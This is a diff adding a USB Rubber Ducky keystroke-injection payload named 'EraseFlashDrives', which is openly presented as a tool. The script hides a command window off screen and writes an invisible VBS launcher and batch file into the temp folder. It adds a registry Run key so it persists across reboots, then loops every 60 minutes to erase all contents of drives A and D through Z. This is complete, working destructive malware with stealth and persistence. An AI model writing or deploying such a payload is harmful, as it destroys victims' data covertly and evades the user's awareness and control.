@@ -1,0 +1,59 @@
+REM By overwraith
+REM EraseFlashDrives.txt
+REM PURPOSE: to delete the contents of attached drives. 
+GUI r
+STRING cmd /Q /D /T:7F /F:OFF /V:OFF /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+REM THE DIRECTORY YOU WANT TO HIDE THE SCRIPT IN
+STRING cd %TEMP%
+ENTER
+REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
+REM Delete vbs file if already exists
+STRING erase /Q invis.vbs
+ENTER
+REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
+STRING copy con invis.vbs
+ENTER
+STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
+ENTER
+CONTROL z
+ENTER
+REM Delete batch file if already exists
+STRING erase /Q SecurityBullseye.bat
+ENTER
+REM Make the batch file
+REM SLIGHT THROWBACK TO VIDEO GAME BIOSHOCK I/II
+STRING copy con SecurityBullseye.bat
+ENTER
+REM REGISTRY KEY RESTARTS THE SCRIPT ON REBOOT
+STRING REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d "wscript.exe %TEMP%\invis.vbs %TEMP%\SecurityBullseye.bat" /f
+ENTER
+STRING :while1
+ENTER
+REM C:\ IS USUALLY THE DRIVE THE OS IS INSTALLED ON, SO OMIT. 
+STRING for %%a in (A B D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
+ENTER
+STRING IF EXIST %%a:\ erase /Q /S /F "%%a:\*.*"
+ENTER
+STRING IF EXIST %%a:\ rmdir /Q /S "%%a:\*"
+ENTER
+STRING )
+ENTER
+STRING timeout /t 60
+ENTER
+STRING goto :while1
+ENTER
+CONTROL z
+ENTER
+REM RUN THE BATCH FILE
+STRING wscript.exe invis.vbs SecurityBullseye.bat
+ENTER
+STRING EXIT
+ENTER
